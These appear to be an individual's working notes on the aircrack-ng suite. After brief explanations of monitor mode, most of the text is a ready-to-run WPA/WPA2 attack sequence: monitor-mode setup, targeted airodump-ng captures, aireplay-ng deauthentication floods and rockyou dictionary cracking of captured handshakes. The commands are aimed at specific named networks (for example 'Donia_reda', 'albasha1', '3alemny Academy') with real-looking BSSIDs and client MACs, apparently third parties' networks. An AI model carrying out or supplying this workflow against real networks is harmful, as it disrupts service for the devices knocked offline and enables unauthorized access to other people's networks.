[aircrack-ng](https://aircrack-ng.org)
======================================

> Aircrack-ng suite:
- airbase-ng
- airdecap-ng
- aireplay-ng
- airodump-ng 
- airolib-ng
- airtun-ng
- aircrack-ng
- airdecloak-ng
- airmon-ng                                ->  
- airodump-ng-oui-update
- airserv-ng
- airventriloquist-ng

wireless repeater


put interface in managed mode
the interface changed its name while putting in monitor mode 
monitor mode: listen to whole bunch of networks instead of listening for oly one
packet injection


# llist wireless interfaces
airmon-ng


how toknow if your (network card = WI-FI device) supported monitor mode ?

iw list
	Supported interface modes:
       * IBSS
		 * managed -> wireless client
		 * AP -> Access Point = hotspot
		 * AP/VLAN
		 * WDS
		 * monitor 
		 * mesh point
...

# convert selected interface from manager mode to monitor mode
airmon-ng start <>


 C4:71:54:BE:26:92  -82        5       83   12   3  54e. WPA  CCMP   PSK  Sameh
D4:7D:FC:0F:78:6A


sudo aireplay-ng -0 100 -a 00:14:7F:0E:B3:7D -c D4:7D:FC:0F:78:6A wlo1mon


sudo airmon-ng
sudo airmon-ng start <wlan0>
sudo airodump-ng <wlan0mon>
sudo airodump-ng --bssid C4:71:54:BE:26:92 -c 3 -w /home/sabry/dotfiles/ali_ wlo1mon
sudo aireplay-ng -0 100 -a <bssid> [-c <mac_address_for_any_device_at_network>] <wlan0mon>
sudo aireplay-ng -0 100 -a 00:14:7F:0E:B3:7D [-c <mac_address_for_any_device_at_network>] <wlan0mon>
sudo aircrack-ng -a2 -w <wordlist_file_path> <handshake.cap>
sudo aircrack-ng -a2 -w /mnt/cyber/rockyou.txt /mnt/fati14-01.cap
sudo aircrack-ng -a2 -w ./rockyou.txt ./len-handshake.cap

-----------------------------------------------------------------------------------------------------
- ESSID: network name
- BSSID: router MAC address
- Channel: [1-12]


 3C:67:8C:CA:7E:28  -83       84       73    0   1  54e  WPA2 CCMP   PSK  3alemny Academy                                                                                      
sudo airodump-ng --bssid 3C:67:8C:CA:7E:28 -c 1 -w /home/sabry/wlan/academy wlo1mon


sudo aireplay-ng -0 100 -a 3C:67:8C:CA:7E:28 -c  3C:67:8C:CA:7E:28 wlo1mon


   -87       48        0    0   3  54e. WPA2 TKIP   PSK  zamalek14                │



sudo airodump-ng --bssid 20:E8:82:85:03:18 -c 5 -w /home/sabry/dotfiles/Donia_reda wlo1mon


sudo aireplay-ng -0 100 -a 1C:59:9B:E7:A3:50 -c 1C:59:9B:E7:A3:50 wlo1mon



 20:E8:82:85:03:18  -85       38      103    0   5  54e  WPA2 CCMP   PSK  Donia_reda                                                                 │7A:4C:CC:6B:64] [ 0| 0 ACKs]



 1C:59:9B:E7:A3:50  -54       41      217    7   7  54e  WPA2 CCMP   PSK  albasha1  

sudo airodump-ng --bssid 1C:59:9B:E7:A3:50 -c 3 -w /home/sabry/dotfiles/albasha1 wlo1mon



sudo aireplay-ng -0 100 -a 1C:59:9B:E7:A3:50 -c 50:29:F5:87:DA:41 wlo1mon






802.11ax (Wi-Fi 6) Adapters
802.11ac Adapters
802.11n Adapters


nixmon - fork -> bcmon

